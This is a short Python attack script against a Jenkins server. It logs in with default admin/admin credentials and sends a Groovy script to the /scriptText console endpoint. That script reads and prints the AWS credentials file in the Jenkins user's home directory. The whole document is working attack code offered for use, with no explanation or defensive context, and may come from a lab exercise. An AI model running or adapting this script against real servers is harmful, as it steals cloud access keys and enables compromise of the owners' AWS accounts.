#!/usr/bin/env python3

import requests
requests.packages.urllib3.disable_warnings()

jenkins_url = "http://localhost:8080"
username = "admin"
password = "admin"

groovy_script = '''
try {
    def file = new File("/home/jenkins/.aws/credentials")
    if (file.exists()) {
        println file.text
    } else {
        println "FILE_NOT_FOUND"
    }
} catch (Exception e) {
    println "ERROR: " + e.message
}
'''

r = requests.post(
    f"{jenkins_url}/scriptText",
    data={"script": groovy_script},
    auth=(username, password),
    verify=False,
    timeout=10
)

print(f"Status Code: {r.status_code}")
print(f"Response:\n{r.text}")
